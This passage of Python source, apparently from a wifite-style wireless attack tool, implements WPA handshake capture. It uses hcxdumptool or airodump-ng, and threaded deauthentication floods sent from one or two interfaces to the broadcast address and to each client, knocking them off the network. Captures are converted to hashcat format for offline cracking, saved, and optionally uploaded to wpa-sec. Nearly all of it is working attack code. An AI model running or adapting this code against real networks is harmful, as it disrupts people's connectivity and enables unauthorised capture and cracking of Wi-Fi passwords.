        thread1 = threading.Thread(
            target=deauth_from_interface,
            args=(self.capture_interface, target.bssid, clients)
        )
        thread2 = threading.Thread(
            target=deauth_from_interface,
            args=(self.deauth_interface, target.bssid, clients)
        )
        
        # Start both threads
        thread1.start()
        thread2.start()
        
        # Wait for both to complete
        thread1.join()
        thread2.join()

    def _capture_handshake_dual_hcxdump(self):
        """
        Capture handshake using dual interface mode with hcxdumptool.
        
        Uses hcxdumptool for full spectrum capture on the primary interface
        and sends parallel deauth from both interfaces for better coverage.
        
        Returns:
            Handshake object if captured, None otherwise
        """
        from ..tools.hcxdumptool import HcxDumpTool, HcxPcapngTool
        
        handshake = None
        
        # Check for existing handshake if not ignoring old ones
        if not Configuration.ignore_old_handshakes:
            bssid = self.target.bssid
            essid = self.target.essid if hasattr(self.target, 'essid') else None
            handshake = self.load_handshake(bssid=bssid, essid=essid)
            if handshake:
                Color.pattack('WPA', self.target, 'Handshake capture',
                              'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                return handshake
        
        # Initialize HcxDumpTool with capture interface only
        # (we'll use aireplay-ng for deauth from both interfaces)
        output_file = Configuration.temp('hcxdump_capture.pcapng')
        
        # Configure deauth based on PMF
        pmf_required = hasattr(self.target, 'pmf_required') and self.target.pmf_required
        
        # Start capture with hcxdumptool
        with HcxDumpTool(interface=self.capture_interface,
                        channel=self.target.channel,
                        target_bssid=None,  # Full spectrum capture (no BSSID filter)
                        output_file=output_file,
                        enable_deauth=False,  # We'll use aireplay-ng for deauth
                        pmf_required=pmf_required) as hcxdump:
            
            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 
                         'Starting hcxdumptool [DUAL-HCX]...')
            
            if self.view:
                self.view.add_log('hcxdumptool capture started')
            
            # Initialize timers
            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
            
            self.clients = []
            
            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': f'Listening for handshake (clients: {len(self.clients)}) [DUAL-HCX]',
                        'metrics': {
                            'Mode': 'DUAL-HCX (hcxdumptool)',
                            'Capture': self.capture_interface,
                            'Deauth': self.deauth_interface,
                            'Clients': len(self.clients),
                            'Deauth Timer': str(deauth_timer),
                            'Timeout': str(timeout_timer)
                        }
                    })
                
                # Display status
                Color.clear_entire_line()
                Color.pattack('WPA',
                              self.target,
                              'Handshake capture',
                              'Listening [DUAL-HCX]. ({C}%s{W}/{C}%s{W}, clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                                  self.capture_interface, self.deauth_interface,
                                  len(self.clients), deauth_timer, timeout_timer))
                
                # Check if hcxdumptool is still running
                if not hcxdump.is_running():
                    from ..util.logger import log_error, log_info
                    
                    # Capture error output to help diagnose the issue
                    error_output = ''
                    try:
                        if hcxdump.proc:
                            stdout, stderr = hcxdump.proc.get_output()
                            if stderr:
                                error_output = stderr.strip()
                            elif stdout:
                                error_output = stdout.strip()
                    except Exception:
                        pass
                    
                    log_error('AttackWPA', f'hcxdumptool process died unexpectedly during capture. Error: {error_output if error_output else "No error output captured"}')
                    log_info('AttackWPA', 'Falling back to airodump-ng capture method')
                    
                    Color.pl('\n{!} {R}hcxdumptool process died unexpectedly{W}')
                    if error_output:
                        Color.pl('{!} {O}Error: {R}%s{W}' % error_output[:200])
                    Color.pl('{!} {O}Falling back to airodump-ng mode{W}')
                    if self.view:
                        self.view.add_log('hcxdumptool process died - falling back to airodump-ng')
                        if error_output:
                            self.view.add_log(f'Error: {error_output[:100]}')
                    
                    # Fall back to airodump-ng capture
                    return self._capture_handshake_dual_airodump()
                
                # Check if capture file has data
                if not hcxdump.has_captured_data():
                    # No data yet — still send deauths to provoke handshake
                    if deauth_timer.ended():
                        self._deauth_parallel(self.target)
                        deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                    time.sleep(step_timer.remaining())
                    continue

                # Monitor capture file size to prevent memory issues
                try:
                    file_size = os.path.getsize(output_file)
                    max_cap_size = 50 * 1024 * 1024  # 50MB limit
                    if file_size > max_cap_size:
                        Color.pl('\n{!} {O}Warning: Capture file is large (%d MB), may cause memory issues{W}' % (file_size // (1024*1024)))
                        if self.view:
                            self.view.add_log(f'Warning: Large capture file ({file_size // (1024*1024)} MB)')
                except (OSError, IOError):
                    pass
                
                # Convert pcapng to hashcat format for validation
                temp_hash_file = Configuration.temp('handshake_check.22000')
                
                # Filter by target BSSID when converting
                from ..util.logger import log_debug
                log_debug('AttackWPA', f'Checking for handshake in capture file (BSSID: {self.target.bssid})')
                
                if HcxPcapngTool.convert_to_hashcat(
                    output_file,
                    temp_hash_file,
                    bssid=self.target.bssid,
                    essid=self.target.essid if hasattr(self.target, 'essid') else None
                ):
                    # Check if the hash file contains a valid handshake
                    if os.path.exists(temp_hash_file) and os.path.getsize(temp_hash_file) > 0:
                        # We got a handshake!
                        from ..util.logger import log_info
                        log_info('AttackWPA', f'Handshake captured successfully for {self.target.bssid} [DUAL-HCX]')
                        
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      self.target,
                                      'Handshake capture',
                                      '{G}Captured handshake{W} [DUAL-HCX]')
                        Color.pl('')
                        
                        if self.view:
                            self.view.add_log('Captured handshake!')
                            self.view.update_progress({
                                'status': 'Handshake captured successfully',
                                'progress': 1.0,
                                'metrics': {
                                    'Handshake': '✓',
                                    'Mode': 'DUAL-HCX (hcxdumptool)',
                                    'Capture': self.capture_interface,
                                    'Deauth': self.deauth_interface,
                                    'Clients': len(self.clients)
                                }
                            })
                        
                        # Create Handshake object from pcapng file
                        handshake = Handshake(output_file, 
                                            bssid=self.target.bssid,
                                            essid=self.target.essid if hasattr(self.target, 'essid') else None)
                        
                        # Upload to wpa-sec if configured
                        if WpaSecUploader.should_upload():
                            # hcxdumptool creates .pcapng files which may contain SAE handshakes
                            capture_type = 'sae' if handshake.capfile.endswith('.pcapng') else 'handshake'
                            if self.view:
                                self.view.add_log("Checking wpa-sec upload configuration...")
                            WpaSecUploader.upload_capture(
                                handshake.capfile,
                                self.target.bssid,
                                self.target.essid if hasattr(self.target, 'essid') else None,
                                capture_type=capture_type,
                                view=self.view
                            )
                        
                        break
                
                # Clean up temp hash file
                if os.path.exists(temp_hash_file):
                    os.remove(temp_hash_file)
                
                # Send parallel deauth when timer expires
                if deauth_timer.ended():
                    self._deauth_parallel(self.target)
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                
                # Sleep for remaining time
                time.sleep(step_timer.remaining())
        
        if handshake is None:
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            # Save copy of handshake
            self.save_handshake(handshake)
        
        return handshake

    def _capture_handshake_single_hcxdump(self):
        """
        Capture handshake using single interface mode with hcxdumptool.
        
        Uses hcxdumptool's built-in deauth capabilities for a single interface,
        creating .pcapng files that work better with modern cracking tools.
        
        Returns:
            Handshake object if captured, None otherwise
        """
        from ..tools.hcxdumptool import HcxDumpTool
        from ..util.logger import log_info
        
        handshake = None
        
        # Try to load existing handshake first
        if not Configuration.ignore_old_handshakes:
            bssid = self.target.bssid
            essid = self.target.essid if self.target.essid_known else None
            handshake = self.load_handshake(bssid=bssid, essid=essid)
            if handshake:
                Color.pattack('WPA', self.target, 'Handshake capture',
                              'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                return handshake
        
        # Configure output file
        output_file = Configuration.temp('hcxdump_single.pcapng')
        
        # Configure deauth based on PMF
        pmf_required = hasattr(self.target, 'pmf_required') and self.target.pmf_required
        
        # Start capture with hcxdumptool
        with HcxDumpTool(interface=Configuration.interface,
                        channel=self.target.channel,
                        target_bssid=self.target.bssid,
                        output_file=output_file,
                        enable_deauth=True,  # Use hcxdumptool's built-in deauth
                        pmf_required=pmf_required) as hcxdump:
            
            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 
                         'Starting hcxdumptool [HCX]...')
            
            log_info('AttackWPA', f'hcxdumptool capture started on {Configuration.interface}')
            
            if self.view:
                self.view.add_log('hcxdumptool capture started')
            
            # Initialize timers
            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            
            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': 'Listening for handshake [HCX]',
                        'metrics': {
                            'Mode': 'HCX (hcxdumptool)',
                            'Interface': Configuration.interface,
                            'Timeout': str(timeout_timer),
                            'Deauth': 'Built-in' if not pmf_required else 'Disabled (PMF)'
                        }
                    })
                
                Color.clear_entire_line()
                Color.pattack('WPA',
                              self.target,
                              'Handshake capture',
                              'Listening [HCX]. (timeout:{R}%s{W})' % timeout_timer)
                
                # Check if hcxdumptool is still running
                if not hcxdump.is_running():
                    # Capture error output to help diagnose the issue
                    error_output = ''
                    try:
                        if hcxdump.proc:
                            stdout, stderr = hcxdump.proc.get_output()
                            if stderr:
                                error_output = stderr.strip()
                            elif stdout:
                                error_output = stdout.strip()
                    except Exception:
                        pass
                    
                    log_error('AttackWPA', f'hcxdumptool process died unexpectedly during capture. Error: {error_output if error_output else "No error output captured"}')
                    Color.pl('\n{!} {R}hcxdumptool process died unexpectedly{W}')
                    
                    if error_output:
                        # Display the actual error to help user diagnose
                        Color.pl('{!} {O}Error output: {R}%s{W}' % error_output[:200])
                        log_error('AttackWPA', f'Full hcxdumptool error: {error_output}')
                    
                    Color.pl('{!} {O}Common causes:{W}')
                    Color.pl('{!} {O}  - Interface not in monitor mode{W}')
                    Color.pl('{!} {O}  - Insufficient permissions (try with sudo){W}')
                    Color.pl('{!} {O}  - Interface busy or in use by another process{W}')
                    Color.pl('{!} {O}  - Driver incompatibility{W}')
                    
                    if self.view:
                        self.view.add_log('hcxdumptool process died unexpectedly')
                        if error_output:
                            self.view.add_log(f'Error: {error_output[:100]}')
                    return None
                
                # Check if capture file has data
                if not hcxdump.has_captured_data():
                    # No data yet, wait
                    time.sleep(step_timer.remaining())
                    continue
                
                # Check for handshake in the capture file
                bssid = self.target.bssid
                essid = self.target.essid if self.target.essid_known else None
                
                log_debug('AttackWPA', f'Checking for handshake in hcxdumptool capture (BSSID: {bssid})')
                
                handshake = Handshake(output_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    log_info('AttackWPA', f'Handshake captured successfully for {bssid} [HCX]')
                    
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                                  self.target,
                                  'Handshake capture',
                                  '{G}Captured handshake{W} [HCX]')
                    Color.pl('')
                    
                    # Update TUI view
                    if self.view:
                        self.view.add_log('Captured handshake!')
                        self.view.update_progress({
                            'status': 'Handshake captured successfully',
                            'progress': 1.0,
                            'metrics': {
                                'Handshake': '✓',
                                'Mode': 'HCX (hcxdumptool)',
                                'Interface': Configuration.interface
                            }
                        })
                    
                    # Upload to wpa-sec if configured
                    if WpaSecUploader.should_upload():
                        # hcxdumptool creates .pcapng files which may contain SAE handshakes
                        capture_type = 'sae' if handshake.capfile.endswith('.pcapng') else 'handshake'
                        if self.view:
                            self.view.add_log("Checking wpa-sec upload configuration...")
                        WpaSecUploader.upload_capture(
                            handshake.capfile,
                            self.target.bssid,
                            self.target.essid,
                            capture_type=capture_type,
                            view=self.view
                        )
                    
                    break
                
                # No handshake yet
                handshake = None
                
                time.sleep(step_timer.remaining())
        
        if handshake is None:
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            # Save copy of handshake
            self.save_handshake(handshake)
        
        return handshake

    def capture_handshake(self):
        """Returns captured or stored handshake, otherwise None."""
        # Check if hcxdump mode is requested for single interface
        if Configuration.use_hcxdump:
            from ..tools.hcxdumptool import HcxDumpTool
            from ..util.logger import log_info, log_warning, log_debug
            
            log_debug('AttackWPA', 'Checking hcxdumptool availability for single interface mode')
            
            # Check if hcxdumptool is available
            if not HcxDumpTool.exists():
                log_warning('AttackWPA', 'hcxdumptool not found, falling back to airodump-ng')
                Color.pl('{!} {O}hcxdumptool not found, falling back to airodump-ng{W}')
            elif not HcxDumpTool.check_minimum_version('6.2.0'):
                current_version = HcxDumpTool.check_version()
                log_warning('AttackWPA', f'hcxdumptool version {current_version} is insufficient (need 6.2.0+), falling back to airodump-ng')
                Color.pl('{!} {O}hcxdumptool version {R}%s{O} is insufficient (need 6.2.0+){W}' % (current_version or 'unknown'))
                Color.pl('{!} {O}Falling back to airodump-ng{W}')
            else:
                # Use hcxdumptool for single interface capture
                log_info('AttackWPA', 'Using hcxdumptool for single interface capture')
                Color.pl('{+} {G}Using hcxdumptool for single interface capture{W}')
                if self.view:
                    self.view.add_log('Using hcxdumptool mode for capture')
                    self.view.set_attack_type("WPA Handshake Capture [HCX]")
                return self._capture_handshake_single_hcxdump()
        
        # Default: use airodump-ng
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            try:
                airodump_target = self.wait_for_target(airodump)
            except Exception as e:
                Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                return None

            self.clients = []

            # Try to load existing handshake
            if not Configuration.ignore_old_handshakes:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture',
                                  'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': f'Listening for handshake (clients: {len(self.clients)})',
                        'metrics': {
                            'Clients': len(self.clients),
                            'Deauth Timer': str(deauth_timer),
                            'Timeout': str(timeout_timer)
                        }
                    })
                
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                                  len(self.clients), deauth_timer, timeout_timer))

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')

                # Check file size before copying to prevent memory issues
                try:
                    file_size = os.path.getsize(cap_file)
                    max_cap_size = 50 * 1024 * 1024  # 50MB limit
                    if file_size > max_cap_size:
                        Color.pl('\n{!} {O}Warning: Capture file is large (%d MB), may cause memory issues{W}' % (file_size // (1024*1024)))
                except (OSError, IOError):
                    pass

                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                                  airodump_target,
                                  'Handshake capture',
                                  '{G}Captured handshake{W}')
                    Color.pl('')
                    
                    # Update TUI view
                    if self.view:
                        self.view.add_log('Captured handshake!')
                        self.view.update_progress({
                            'status': 'Handshake captured successfully',
                            'progress': 1.0,
                            'metrics': {
                                'Handshake': '✓',
                                'Clients': len(self.clients)
                            }
                        })
                    
                    break

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Look for new clients
                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                    break  # Exit the capture loop
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      airodump_target,
                                      'Handshake capture',
                                      'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)
                        
                        # Update TUI view
                        if self.view:
                            self.view.add_log(f'Discovered new client: {client.station}')

                # Send deauth to a client or broadcast
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())

        if handshake is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)

        return handshake

    @staticmethod
    def load_handshake(bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(r'handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    @staticmethod
    def save_handshake(handshake):
        """
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        """
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = f'handshake_{essid_safe}_{bssid_safe}_{date}.cap'
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
        Color.pl('{G}saved{W}')
        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename

    def deauth(self, target):
        """
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        """
        if Configuration.no_deauth:
            return

        for client in [None] + self.clients:
            target_name = '*broadcast*' if client is None else client
            Color.clear_entire_line()
            Color.pattack('WPA',
                          target,
                          'Handshake capture',
                          'Deauthing {O}%s{W}' % target_name)
            
            # Update TUI view
            if self.view:
                self.view.add_log(f'Sending deauth to {target_name}')
            
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target

    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2' \
             ',        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
    Configuration.exit_gracefully()
